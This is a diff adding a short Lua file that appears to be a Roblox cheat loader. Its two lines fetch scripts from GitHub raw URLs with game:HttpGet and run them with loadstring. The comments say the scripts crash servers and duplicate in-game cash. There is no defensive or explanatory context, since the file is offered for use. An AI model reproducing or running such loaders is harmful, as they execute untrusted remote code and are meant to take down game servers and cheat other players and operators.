@@ -1,0 +1,4 @@
+--\Swagmode
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002%27'))() 
+--\Crash servers and dupe cash
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher%27'))()
